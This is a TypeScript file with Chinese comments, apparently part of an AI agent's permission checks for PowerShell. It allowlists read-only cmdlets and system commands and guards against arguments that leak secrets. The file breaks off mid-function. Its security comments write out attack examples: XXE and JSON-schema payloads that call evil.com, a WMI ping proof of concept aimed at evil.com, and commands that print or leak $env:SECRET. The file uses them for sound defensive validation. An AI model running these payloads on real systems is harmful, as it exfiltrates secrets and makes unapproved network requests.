/**
 * PowerShell 只读命令校验。
 *
 * cmdlet 不区分大小写；所有匹配均以小写进行。
 */

import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../utils/powershell/parser.js'

type ParsedStatement = ParsedPowerShellCommand['statements'][number]

import { getPlatform } from '../../utils/platform.js'
import {
  COMMON_ALIASES,
  deriveSecurityFlags,
  getPipelineSegments,
  isNullRedirectionTarget,
  isPowerShellParameter,
} from '../../utils/powershell/parser.js'
import type { ExternalCommandConfig } from '../../utils/shell/readOnlyCommandValidation.js'
import {
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import { COMMON_PARAMETERS } from './commonParameters.js'

const DOTNET_READ_ONLY_FLAGS = new Set([
  '--version',
  '--info',
  '--list-runtimes',
  '--list-sdks',
])

type CommandConfig = {
  /** 该命令的安全子命令或标志 */
  safeFlags?: string[]
  /**
   * 为 true 时，无论 safeFlags 如何都允许所有标志。
   * 用于整个标志面都是只读的命令（例如 hostname）。
   * 若没有这一项，空/缺失的 safeFlags 会拒绝所有标志（仅允许
   * 位置参数）。
   */
  allowAllFlags?: boolean
  /** 对原始命令的正则约束 */
  regex?: RegExp
  /** 额外的校验回调——命令危险时返回 true */
  additionalCommandIsDangerousCallback?: (
    command: string,
    element?: ParsedCommandElement,
  ) => boolean
}

/**
 * 供那些会把参数打印或强制转换到 stdout/
 * stderr 的 cmdlet 共用的回调。`Write-Output $env:SECRET` 会直接打印它；`Start-Sleep
 * $env:SECRET` 则通过类型转换错误泄露（"Cannot convert value 'sk-...'
 * to System.Double"）。Bash 的 echo 正则按 token 白名单校验安全字符。
 *
 * 两项检查：
 * 1. elementTypes 白名单——StringConstant（字面量）+ Parameter（标志
 *    名）。拒绝 Variable、Other（HashtableAst/ConvertExpressionAst/
 *    BinaryExpressionAst 都映射为 Other）、ScriptBlock、SubExpression、
 *    ExpandableString。与 SAFE_PATH_ELEMENT_TYPES 相同的模式。
 * 2. 冒号绑定的参数值——`-InputObject:$env:SECRET` 会创建
 *    单个 CommandParameterAst；其中的 VariableExpressionAst 是它的 .Argument
 *    子节点，而不是独立的 CommandElement。elementTypes = [..., 'Parameter']，
 *    白名单通过。需查询 children[] 获取 .Argument 映射后的类型；
 *    除 StringConstant 之外的任何类型（Variable、包裹任意管道的
 *    ParenExpression、Hashtable 等）都是泄露途径。
 */
export function argLeaksValue(
  _cmd: string,
  element?: ParsedCommandElement,
): boolean {
  const argTypes = (element?.elementTypes ?? []).slice(1)
  const args = element?.args ?? []
  const children = element?.children
  for (let i = 0; i < argTypes.length; i++) {
    if (argTypes[i] !== 'StringConstant' && argTypes[i] !== 'Parameter') {
      // ArrayLiteralAst（`Select-Object Name, Id`）映射为 'Other'——解析脚本
      // 只为 CommandParameterAst.Argument 填充 children，
      // 因此无法检查其中的元素。回退到对 extent 文本做
      // 字符串考古：Hashtable 有 `@{`，ParenExpr 有 `(`，变量有
      // `$`，类型字面量有 `[`，scriptblock 有 `{`。由裸标识符组成的
      // 逗号列表则都没有。`Name, $x` 仍会因 `$` 被拒。
      if (!/[$(@{[]/.test(args[i] ?? '')) {
        continue
      }
      return true
    }
    if (argTypes[i] === 'Parameter') {
      const paramChildren = children?.[i]
      if (paramChildren) {
        if (paramChildren.some(c => c.type !== 'StringConstant')) {
          return true
        }
      } else {
        // 回退：对参数文本做字符串考古（适用于尚未提供 children 的解析器）。
        // 拒绝 `$`（变量）、`(`（ParenExpressionAst）、`@`（哈希/数组
        // 下标）、`{`（scriptblock）、`[`（类型字面量/静态方法）。
        const arg = args[i] ?? ''
        const colonIdx = arg.indexOf(':')
        if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
          return true
        }
      }
    }
  }
  return false
}

/**
 * 被视为只读的 PowerShell cmdlet 允许列表。
 * 每个 cmdlet 映射到其配置，包括安全标志。
 *
 * 注意：PowerShell cmdlet 不区分大小写，因此我们以小写存储键，
 * 并在匹配时归一化输入。
 *
 * 使用 Object.create(null) 防止原型链污染——攻击者
 * 可控的命令名如 'constructor' 或 '__proto__' 必须返回
 * undefined，而不是继承来的 Object.prototype 属性。与 parser.ts 中的
 * COMMON_ALIASES 采用相同的防御。
 */
export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
  Object.create(null) as Record<string, CommandConfig>,
  {
    // =========================================================================
    // PowerShell Cmdlet - 文件系统（只读）
    // =========================================================================
    'get-childitem': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Filter',
        '-Include',
        '-Exclude',
        '-Recurse',
        '-Depth',
        '-Name',
        '-Force',
        '-Attributes',
        '-Directory',
        '-File',
        '-Hidden',
        '-ReadOnly',
        '-System',
      ],
    },
    'get-content': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-TotalCount',
        '-Head',
        '-Tail',
        '-Raw',
        '-Encoding',
        '-Delimiter',
        '-ReadCount',
      ],
    },
    'get-item': {
      safeFlags: ['-Path', '-LiteralPath', '-Force', '-Stream'],
    },
    'get-itemproperty': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'test-path': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-PathType',
        '-Filter',
        '-Include',
        '-Exclude',
        '-IsValid',
        '-NewerThan',
        '-OlderThan',
      ],
    },
    'resolve-path': {
      safeFlags: ['-Path', '-LiteralPath', '-Relative'],
    },
    'get-filehash': {
      safeFlags: ['-Path', '-LiteralPath', '-Algorithm', '-InputStream'],
    },
    'get-acl': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Audit',
        '-Filter',
        '-Include',
        '-Exclude',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet - 导航（只读，仅更改工作目录）
    // =========================================================================
    'set-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'push-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'pop-location': {
      safeFlags: ['-PassThru', '-StackName'],
    },

    // =========================================================================
    // PowerShell Cmdlet - 文本搜索/过滤（只读）
    // =========================================================================
    'select-string': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Pattern',
        '-InputObject',
        '-SimpleMatch',
        '-CaseSensitive',
        '-Quiet',
        '-List',
        '-NotMatch',
        '-AllMatches',
        '-Encoding',
        '-Context',
        '-Raw',
        '-NoEmphasis',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet - 数据转换（纯变换，无副作用）
    // =========================================================================
    'convertto-json': {
      safeFlags: [
        '-InputObject',
        '-Depth',
        '-Compress',
        '-EnumsAsStrings',
        '-AsArray',
      ],
    },
    'convertfrom-json': {
      safeFlags: ['-InputObject', '-Depth', '-AsHashtable', '-NoEnumerate'],
    },
    'convertto-csv': {
      safeFlags: [
        '-InputObject',
        '-Delimiter',
        '-NoTypeInformation',
        '-NoHeader',
        '-UseQuotes',
      ],
    },
    'convertfrom-csv': {
      safeFlags: ['-InputObject', '-Delimiter', '-Header', '-UseCulture'],
    },
    'convertto-xml': {
      safeFlags: ['-InputObject', '-Depth', '-As', '-NoTypeInformation'],
    },
    'convertto-html': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Head',
        '-Title',
        '-Body',
        '-Pre',
        '-Post',
        '-As',
        '-Fragment',
      ],
    },
    'format-hex': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-InputObject',
        '-Encoding',
        '-Count',
        '-Offset',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet - 对象检查与操作（只读）
    // =========================================================================
    'get-member': {
      safeFlags: [
        '-InputObject',
        '-MemberType',
        '-Name',
        '-Static',
        '-View',
        '-Force',
      ],
    },
    'get-unique': {
      safeFlags: ['-InputObject', '-AsString', '-CaseInsensitive', '-OnType'],
    },
    'compare-object': {
      safeFlags: [
        '-ReferenceObject',
        '-DifferenceObject',
        '-Property',
        '-SyncWindow',
        '-CaseSensitive',
        '-Culture',
        '-ExcludeDifferent',
        '-IncludeEqual',
        '-PassThru',
      ],
    },
    // SECURITY: select-xml 已移除。XML 外部实体（XXE）解析会
    // 通过 -Content 或 -Xml 中的 DOCTYPE SYSTEM/PUBLIC 引用
    // 触发网络请求。`Select-Xml -Content '<!DOCTYPE x [<!ENTITY e SYSTEM
    // "http://evil.com/x">]><x>&e;</x>' -XPath '/'` 会发出 GET 请求。
    // PowerShell 的 XmlDocument.LoadXml 默认不会禁用实体解析。
    // 移除该项即强制弹窗确认。
    'join-string': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Separator',
        '-OutputPrefix',
        '-OutputSuffix',
        '-SingleQuote',
        '-DoubleQuote',
        '-FormatString',
      ],
    },
    // SECURITY: Test-Json 已移除。-Schema（位置 1）接受带 $ref 指向外部
    // URL 的 JSON Schema——Test-Json 会抓取它们（网络
    // 请求）。safeFlags 只校验显式标志，不校验位置绑定：
    // `Test-Json '{}' '{"$ref":"http://evil.com"}'` → 位置 1 绑定到
    // -Schema → safeFlags 检查看到两个非标志参数，两者都跳过 → 自动放行。
    'get-random': {
      safeFlags: [
        '-InputObject',
        '-Minimum',
        '-Maximum',
        '-Count',
        '-SetSeed',
        '-Shuffle',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet - 路径工具（只读）
    // =========================================================================
    // convert-path 的全部用途就是解析文件系统路径。它现在位于
    // CMDLET_PATH_CONFIG 中以便进行正确的路径校验，因此此处的 safeFlags
    // 只列出路径参数（由 CMDLET_PATH_CONFIG 负责校验）。
    'convert-path': {
      safeFlags: ['-Path', '-LiteralPath'],
    },
    'join-path': {
      // 已移除 -Resolve：它会访问文件系统以验证拼接后的路径
      // 是否存在，但该路径并未针对允许的目录做过校验。
      // 不含 -Resolve 时，Join-Path 是纯字符串操作。
      safeFlags: ['-Path', '-ChildPath', '-AdditionalChildPath'],
    },
    'split-path': {
      // 已移除 -Resolve：理由同 join-path。不含 -Resolve 时，
      // Split-Path 是纯字符串操作。
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Qualifier',
        '-NoQualifier',
        '-Parent',
        '-Leaf',
        '-LeafBase',
        '-Extension',
        '-IsAbsolute',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet - 其他系统信息（只读）
    // =========================================================================
    // 注意：有意不包含 Get-Clipboard——它可能暴露用户复制过的
    // 敏感数据，如密码或 API 密钥。Bash 同样
    // 不会自动放行剪贴板命令（pbpaste、xclip 等）。
    'get-hotfix': {
      safeFlags: ['-Id', '-Description'],
    },
    'get-itempropertyvalue': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'get-psprovider': {
      safeFlags: ['-PSProvider'],
    },

    // =========================================================================
    // PowerShell Cmdlet - 进程/系统信息
    // =========================================================================
    'get-process': {
      safeFlags: [
        '-Name',
        '-Id',
        '-Module',
        '-FileVersionInfo',
        '-IncludeUserName',
      ],
    },
    'get-service': {
      safeFlags: [
        '-Name',
        '-DisplayName',
        '-DependentServices',
        '-RequiredServices',
        '-Include',
        '-Exclude',
      ],
    },
    'get-computerinfo': {
      allowAllFlags: true,
    },
    'get-host': {
      allowAllFlags: true,
    },
    'get-date': {
      safeFlags: ['-Date', '-Format', '-UFormat', '-DisplayHint', '-AsUTC'],
    },
    'get-location': {
      safeFlags: ['-PSProvider', '-PSDrive', '-Stack', '-StackName'],
    },
    'get-psdrive': {
      safeFlags: ['-Name', '-PSProvider', '-Scope'],
    },
    // SECURITY: 已从允许列表移除 Get-Command。-Name（位置 0，
    // ValueFromPipeline=true）会触发模块自动加载，从而运行 .psm1 初始化
    // 代码。链式攻击：预先在 PSModulePath 中植入模块，再触发自动加载。
    // 此前曾尝试从 safeFlags 中移除 -Name/-Module 并拒绝
    // 位置形式的 StringConstant，但管道输入（`'EvilCmdlet' | Get-Command`）
    // 由于参数为空而完全绕过回调。移除该项即强制
    // 弹窗确认。需要它的用户可自行添加显式允许规则。
    'get-module': {
      safeFlags: [
        '-Name',
        '-ListAvailable',
        '-All',
        '-FullyQualifiedName',
        '-PSEdition',
      ],
    },
    // SECURITY: 已从允许列表移除 Get-Help。与 Get-Command 相同的模块
    // 自动加载风险（-Name 的 ValueFromPipeline=true，管道输入会绕过
    // 参数级回调）。移除该项即强制弹窗确认。
    'get-alias': {
      safeFlags: ['-Name', '-Definition', '-Scope', '-Exclude'],
    },
    'get-history': {
      safeFlags: ['-Id', '-Count'],
    },
    'get-culture': {
      allowAllFlags: true,
    },
    'get-uiculture': {
      allowAllFlags: true,
    },
    'get-timezone': {
      safeFlags: ['-Name', '-Id', '-ListAvailable'],
    },
    'get-uptime': {
      allowAllFlags: true,
    },

    // =========================================================================
    // PowerShell Cmdlet - 输出及其他（无副作用）
    // =========================================================================
    // 与 Bash 对齐：`echo` 通过自定义正则自动放行（BashTool
    // readOnlyValidation.ts:~1517）。该正则按参数白名单校验安全字符。
    // 它拦截的三种攻击形态见上面的 argLeaksValue。
    'write-output': {
      safeFlags: ['-InputObject', '-NoEnumerate'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Write-Host 绕过管道（Information 流，PS5+），因此能力
    // 严格弱于 Write-Output——但同样的
    // `Write-Host $env:SECRET` 显示型泄露依然存在。
    'write-host': {
      safeFlags: [
        '-Object',
        '-NoNewline',
        '-Separator',
        '-ForegroundColor',
        '-BackgroundColor',
      ],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // 与 Bash 对齐：`sleep` 在 READONLY_COMMANDS 中（BashTool
    // readOnlyValidation.ts:~1146）。运行时零副作用——但
    // `Start-Sleep $env:SECRET` 会通过类型转换错误泄露。同样的守卫。
    'start-sleep': {
      safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // 安全审查发现 Format-* 和 Measure-Object 都接受计算属性哈希表
    // （与 Where-Object 相同的利用方式——I4 回归），因此将它们从
    // SAFE_OUTPUT_CMDLETS 移到这里。isSafeOutputCommand 是
    // 仅按名称的检查，会在参数校验之前把它们过滤出审批循环。在这里，
    // argLeaksValue 会校验参数：
    //   | Format-Table               → 无参数 → 安全 → 放行
    //   | Format-Table Name, CPU     → 位置参数为 StringConstant → 安全 → 放行
    //   | Format-Table $env:SECRET   → elementType 为 Variable → 拦截 → 透传
    //   | Format-Table @{N='x';E={}} → Other（HashtableAst）→ 拦截 → 透传
    //   | Measure-Object -Property $env:SECRET → 同上 → 拦截
    // allowAllFlags：argLeaksValue 会校验参数的 elementTypes（Variable/Hashtable/
    // ScriptBlock → 拦截）。Format-* 自身的标志（-AutoSize、-GroupBy、
    // -Wrap 等）仅用于显示。若没有 allowAllFlags，空 safeFlags
    // 默认会拒绝所有标志——`Format-Table -AutoSize` 会过度弹窗。
    'format-table': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-list': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-wide': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-custom': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'measure-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Select-Object/Sort-Object/Group-Object/Where-Object：与 format-* 相同的
    // 计算属性哈希表面（about_Calculated_Properties）。
    // 它们已从 SAFE_OUTPUT_CMDLETS 移除，但此前在这里缺失，导致
    // `Get-Process | Select-Object Name` 过度弹窗。argLeaksValue 以相同方式
    // 处理它们：StringConstant 属性名通过（`Select-Object Name`），
    // HashtableAst/ScriptBlock/Variable 参数则拦截（`Select-Object @{N='x';E={...}}`、
    // `Where-Object { ... }`）。allowAllFlags：-First/-Last/-Skip/-Descending/
    // -Property/-EQ 等都是选择/排序标志——本身无害；
    // argLeaksValue 会捕获危险的参数*值*。
    'select-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'sort-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'group-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'where-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Out-String/Out-Host 已从 SAFE_OUTPUT_CMDLETS 移到这里——两者都接受
    // -InputObject，会以与 Write-Output 相同的方式泄露。
    // `Get-Process | Out-String -InputObject $env:SECRET` → 密钥被打印。
    // allowAllFlags：-Width/-Stream/-Paging/-NoNewline 是显示标志；
    // argLeaksValue 会捕获危险的 -InputObject *值*。
    'out-string': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'out-host': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },

    // =========================================================================
    // PowerShell Cmdlet - 网络信息（只读）
    // =========================================================================
    'get-netadapter': {
      safeFlags: [
        '-Name',
        '-InterfaceDescription',
        '-InterfaceIndex',
        '-Physical',
      ],
    },
    'get-netipaddress': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-Type',
      ],
    },
    'get-netipconfiguration': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-Detailed', '-All'],
    },
    'get-netroute': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-DestinationPrefix',
      ],
    },
    'get-dnsclientcache': {
      // SECURITY: 排除 -CimSession/-ThrottleLimit。-CimSession 会连接
      // 远程主机（网络请求）。此前配置为空 = 所有标志都放行。
      safeFlags: ['-Entry', '-Name', '-Type', '-Status', '-Section', '-Data'],
    },
    'get-dnsclient': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias'],
    },

    // =========================================================================
    // PowerShell Cmdlet - 事件日志（只读）
    // =========================================================================
    'get-eventlog': {
      safeFlags: [
        '-LogName',
        '-Newest',
        '-After',
        '-Before',
        '-EntryType',
        '-Index',
        '-InstanceId',
        '-Message',
        '-Source',
        '-UserName',
        '-AsBaseObject',
        '-List',
      ],
    },
    'get-winevent': {
      // SECURITY: 已移除 -FilterXml/-FilterHashtable。-FilterXml 接受带
      // DOCTYPE 外部实体的 XML（XXE → 网络请求）。-FilterHashtable
      // 本会被 elementTypes 的 'Other' 检查捕获，因为 @{} 是
      // HashtableAst，但这里显式移除。与 Select-Xml 相同的 XXE 风险
      // （已在上文移除）。保留 -FilterXPath（仅字符串模式，不做实体
      // 解析）。-ComputerName/-Credential 也被隐式排除。
      safeFlags: [
        '-LogName',
        '-ListLog',
        '-ListProvider',
        '-ProviderName',
        '-Path',
        '-MaxEvents',
        '-FilterXPath',
        '-Force',
        '-Oldest',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet - WMI/CIM
    // =========================================================================
    // SECURITY: 已移除 Get-WmiObject 和 Get-CimInstance。它们会通过
    // Win32_PingStatus 之类的类主动触发网络请求（枚举时会发送 ICMP），
    // 并可通过 -ComputerName/
    // CimSession 查询远程计算机。-Class/-ClassName/-Filter/-Query 接受任意
    // WMI 类/WQL，我们无法静态校验。
    //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
    //   → 向 evil.com 发送 ICMP（DNS 泄露 + 可能的 NTLM 认证泄露）。
    // WMI 还可能自动加载提供程序 DLL（初始化代码）。移除该项即强制弹窗确认。
    // get-cimclass 保留——它只列出类元数据，不枚举实例。
    'get-cimclass': {
      safeFlags: [
        '-ClassName',
        '-Namespace',
        '-MethodName',
        '-PropertyName',
        '-QualifierName',
      ],
    },

    // =========================================================================
    // Git - 使用共享的外部命令校验，并逐标志检查
    // =========================================================================
    git: {},

    // =========================================================================
    // GitHub CLI (gh) - 使用共享的外部命令校验
    // =========================================================================
    gh: {},

    // =========================================================================
    // Docker - 使用共享的外部命令校验
    // =========================================================================
    docker: {},

    // =========================================================================
    // Windows 专属系统命令
    // =========================================================================
    ipconfig: {
      // SECURITY: 在 macOS 上，`ipconfig set <iface> <mode>` 会配置网络
      // （写入系统配置）。safeFlags 只校验标志，位置参数
      // 会被跳过。因此拒绝任何位置参数——只允许裸 `ipconfig` 或
      // `ipconfig /all`（只读展示）。Windows 的 ipconfig 只用
      // /标志（展示），macOS 的 ipconfig 使用子命令（get/set/waitall）。
      safeFlags: ['/all', '/displaydns', '/allcompartments'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        return (element?.args ?? []).some(
          a => !a.startsWith('/') && !a.startsWith('-'),
        )
      },
    },
    netstat: {
      safeFlags: [
        '-a',
        '-b',
        '-e',
        '-f',
        '-n',
        '-o',
        '-p',
        '-q',
        '-r',
        '-s',
        '-t',
        '-x',
        '-y',
      ],
    },
    systeminfo: {
      safeFlags: ['/FO', '/NH'],
    },
    tasklist: {
      safeFlags: ['/M', '/SVC', '/V', '/FI', '/FO', '/NH'],
    },
    // where.exe：Windows 的 PATH 定位工具，等价于 bash 的 `which`。它经由
    // isAllowlistedCommand 中 nameType 门禁的 SAFE_EXTERNAL_EXES 绕行到达这里。
    // 所有标志都是只读的（/R /F /T /Q），与 bash 在 BashTool
    // READONLY_COMMANDS 中对 `which` 的处理一致。
    'where.exe': {
      allowAllFlags: true,
    },
    hostname: {
      // SECURITY: 在 Linux/macOS 上，`hostname NAME` 会设置主机名（写入
      // 系统配置）。`hostname -F FILE` / `--file=FILE` 也会从文件设置。
      // 只允许裸 `hostname` 和已知的只读标志。
      safeFlags: ['-a', '-d', '-f', '-i', '-I', '-s', '-y', '-A'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // 拒绝任何位置（非标志）参数——它会设置主机名。
        return (element?.args ?? []).some(a => !a.startsWith('-'))
      },
    },
    whoami: {
      safeFlags: [
        '/user',
        '/groups',
        '/claims',
        '/priv',
        '/logonid',
        '/all',
        '/fo',
        '/nh',
      ],
    },
    ver: {
      allowAllFlags: true,
    },
    arp: {
      safeFlags: ['-a', '-g', '-v', '-N'],
    },
    route: {
      safeFlags: ['print', 'PRINT', '-4', '-6'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // SECURITY: route.exe 的语法是 `route [-f] [-p] [-4|-6] VERB [args...]`。
        // 第一个非标志位置参数是动词。`route add 10.0.0.0 mask
        // 255.0.0.0 192.168.1.1 print` 会添加一条路由（print 是末尾的显示
        // 修饰符）。旧检查用 args.some('print')，会在任意位置匹配 'print'
        // ——对位置不敏感。
        if (!element) {
          return true
        }
        const verb = element.args.find(a => !a.startsWith('-'))
        return verb?.toLowerCase() !== 'print'
      },
    },
    // netsh：有意不加入允许列表。PR #22060 中三轮黑名单缺口
    // （动词位置 → 短横线标志 → 斜杠标志 → 更多动词）证明
    // 该语法过于复杂，无法安全地加入允许列表：三层上下文嵌套
    // （`netsh interface ipv4 show addresses`）、双前缀标志（-f / /f）、
    // 通过 -f 和 `exec` 执行脚本、通过 -r 发起远程 RPC、离线模式
    // 提交、wlan connect/disconnect 等。每次扩充黑名单都会暴露
    // 新的缺口。`route` 保留——`route print` 是唯一的只读形式，
    // 语法简单，只有单个动词位置。
    getmac: {
      safeFlags: ['/FO', '/NH', '/V'],
    },

    // =========================================================================
    // 跨平台 CLI 工具
    // =========================================================================
    // 文件检查
    // SECURITY: file -C 会编译 magic 数据库并写入磁盘。只
    // 允许内省类标志；拒绝 -C / --compile / -m / --magic-file。
    file: {
      safeFlags: [
        '-b',
        '--brief',
        '-i',
        '--mime',
        '-L',
        '--dereference',
        '--mime-type',
        '--mime-encoding',
        '-z',
        '--uncompress',
        '-p',
        '--preserve-date',
        '-k',
        '--keep-going',
        '-r',
        '--raw',
        '-v',
        '--version',
        '-0',
        '--print0',
        '-s',
        '--special-files',
        '-l',
        '-F',
        '--separator',
        '-e',
        '-P',
        '-N',
        '--no-pad',
        '-E',
        '--extension',
      ],
    },
    tree: {
      safeFlags: ['/F', '/A', '/Q', '/L'],
    },
    findstr: {
      safeFlags: [
        '/B',
        '/E',
        '/L',
        '/R',
        '/S',
        '/I',
        '/X',
        '/V',
        '/N',
        '/M',
        '/O',
        '/P',
        // 标志匹配在比较前会去掉 ':'（例如 /C:pattern → /C），
        // 因此这些条目不得包含末尾的冒号。
        '/C',
        '/G',
        '/D',
        '/A',
      ],
    },

    // =========================================================================
    // 包管理器 - 使用共享的外部命令校验
    // =========================================================================
    dotnet: {},

    // SECURITY: 已移除 man 和 help 的直接条目。它们指向 Get-Help
    // 的别名（该命令也已移除——见上文）。没有这些条目时，lookupAllowlist
    // 会通过 COMMON_ALIASES 解析为 'get-help'，而它不在允许列表中 →
    // 弹窗确认。与 Get-Help 相同的模块自动加载风险。
  },
)

/**
 * 可接收管道输入的安全输出/格式化 cmdlet。
 * 以规范化的小写 cmdlet 名存储。
 */
const SAFE_OUTPUT_CMDLETS = new Set([
  'out-null',
  // 不含 out-string/out-host——两者都接受 -InputObject，会以与
  // Write-Output 相同的方式泄露参数。已连同 argLeaksValue 一起移到 CMDLET_ALLOWLIST。
  // `Get-Process | Out-String -InputObject $env:SECRET`——Out-String 此前
  // 仅按名称过滤，$env 参数从未被校验。
  // out-null 保留：它会丢弃一切，没有 -InputObject 泄露问题。
  // 不含 foreach-object / where-object / select-object / sort-object /
  // group-object / format-table / format-list / format-wide / format-custom /
  // measure-object——它们都接受计算属性哈希表或脚本块
  // 谓词，会在运行时求值任意表达式
  // （about_Calculated_Properties）。例如：
  //   Where-Object @{k=$env:SECRET}       — HashtableAst 参数，elementType 为 'Other'
  //   Select-Object @{N='x';E={...}}      — 计算属性 scriptblock
  //   Format-Table $env:SECRET            — 位置形式的 -Property，会作为表头打印
  //   Measure-Object -Property $env:SECRET — 通过 "property 'sk-...' not found" 泄露
  //   ForEach-Object { $env:PATH='e' }    — 任意脚本体
  // isSafeOutputCommand 是仅按名称的检查——第 5 步会在参数校验运行
  // 之前把它们过滤出审批循环。若把它们放在这里，全为安全输出的
  // 管道尾部会在 subCommands 为空时自动放行，无论
  // 参数包含什么。移除它们即强制该尾部经过参数级
  // 校验（hashtable 的 elementType 为 'Other' → 在
  // isAllowlistedCommand 处未通过白名单 → 询问；裸 $var 为 'Variable' → 同样）。
  //
  // 不含 write-output——位于管道首位的 $env:VAR 是 VariableExpressionAst，
  // 会被 getSubCommandsForPermissionCheck 跳过（非 CommandAst）。若把
  // write-output 放在这里，`$env:SECRET | Write-Output` → WO 被当作
  // 安全输出过滤 → subCommands 为空 → 自动放行 → 密钥被打印。
  // CMDLET_ALLOWLIST 中的条目负责处理直接调用 `Write-Output 'literal'` 的情况。
])

/**
 * 从 SAFE_OUTPUT_CMDLETS 移到 CMDLET_ALLOWLIST 并带上
 * argLeaksValue 的 cmdlet。它们是管道尾部变换器（Format-*、
 * Measure-Object、Select-Object 等），此前仅按名称
 * 作为安全输出过滤。现在它们需要参数校验（argLeaksValue
 * 会拦截计算属性哈希表 / scriptblock / 变量参数）。
 *
 * 由 isAllowlistedPipelineTail 用于 checkPermissionMode 和
 * isReadOnlyCommand 中的窄范围回退——这些调用方需要与
 * SAFE_OUTPUT_CMDLETS 相同的“跳过无害管道尾部”行为，但
 * 要带 argLeaksValue 守卫。
 */
const PIPELINE_TAIL_CMDLETS = new Set([
  'format-table',
  'format-list',
  'format-wide',
  'format-custom',
  'measure-object',
  'select-object',
  'sort-object',
  'group-object',
  'where-object',
  'out-string',
  'out-host',
])

/**
 * 允许通过 nameType='application' 门禁的外部 .exe 名称。
 *
 * classifyCommandName 对任何含点的名称返回 'application'，而
 * isAllowlistedCommand 处的 nameType 门禁会在查允许列表之前将其拒绝。
 * 该门禁的存在是为了阻止 scripts\Get-Process → stripModulePrefix →
 * cmd.name='Get-Process' 这类伪装。但它也会误伤良性的、经 PATH 解析的
 * .exe 名称，如 where.exe（等价于 bash 的 `which`——纯读取，没有危险
 * 标志）。
 *
 * SECURITY: 该绕行检查的是 cmd.text 的原始首个 token，而非 cmd.name。
 * stripModulePrefix 会把 scripts\where.exe 折叠为 cmd.name='where.exe'，但
 * cmd.text 仍保留原始的 'scripts\where.exe ...'。匹配 cmd.text 的
 * 首个 token 即可挫败这种伪装——只有裸 `where.exe`（PATH 查找）
 * 能通过。
 *
 * 这里的每个条目都必须有对应的 CMDLET_ALLOWLIST 条目以进行标志
 * 校验。
 */
const SAFE_EXTERNAL_EXES = new Set(['where.exe'])

/**
 * PowerShell 会通过 PATH 查找解析的 Windows PATHEXT 扩展名。
 * `git.exe`、`git.cmd`、`git.bat`、`git.com` 在运行时都会调用 git，
 * 必须解析为同一个规范名，以便 git 安全守卫生效。
 * 有意排除 .ps1——名为 git.ps1 的脚本不是 git
 * 二进制，也不会触发 git 的钩子机制。
 */
const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/

/**
 * 使用 COMMON_ALIASES 将命令名解析为其规范 cmdlet 名。
 * 对不含路径的名称剥离 Windows 可执行扩展名（.exe、.cmd、.bat、.com），
 * 使例如 `git.exe` 规范化为 `git` 并触发 git 安全
 * 守卫（powershellPermissions.ts 的 hasGitSubCommand）。SECURITY: 仅当
 * 名称不含路径分隔符时才剥离——`scripts\git.exe` 是相对路径
 * （运行本地脚本，而非经 PATH 解析的 git），绝不能规范化为
 * `git`。返回小写的规范名。
 */
export function resolveToCanonical(name: string): string {
  let lower = name.toLowerCase()
  // 仅对裸名称剥离 PATHEXT——路径会运行特定文件，而不是
  // 守卫所要防范的、经 PATH 解析的可执行文件。
  if (!lower.includes('\\') && !lower.includes('/')) {
